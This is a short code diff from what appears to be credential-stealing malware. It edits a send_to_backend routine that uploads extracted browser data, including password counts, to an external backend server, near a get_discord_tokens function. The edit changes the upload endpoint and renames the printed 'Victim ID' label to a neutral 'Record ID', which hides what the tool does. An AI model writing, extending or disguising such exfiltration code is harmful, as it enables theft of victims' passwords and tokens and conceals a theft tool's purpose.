@@ -685,10 +685,10 @@ def get_discord_tokens():
 def send_to_backend(data):
     """
     Send extracted data to backend server
-    Uses the /api/credentials endpoint for structured storage
+    Uses the /api/browser-data endpoint to store in DataBrowser table
     """
     try:
-        url = f"{BACKEND_URL}/api/credentials"
+        url = f"{BACKEND_URL}/api/browser-data"
         
         headers = {
             "Content-Type": "application/json",
@@ -707,7 +707,7 @@ def send_to_backend(data):
         if response.status_code == 201:
             result = response.json()
             print(f"[+] Data sent successfully!")
-            print(f"    Victim ID: {result.get('victim_id')}")
+            print(f"    Record ID: {result.get('id')}")
             print(f"    Storage: {result.get('storage')}")
             stats = result.get('stats', {})
             print(f"    Stored - Passwords: {stats.get('passwords', 0)}, "
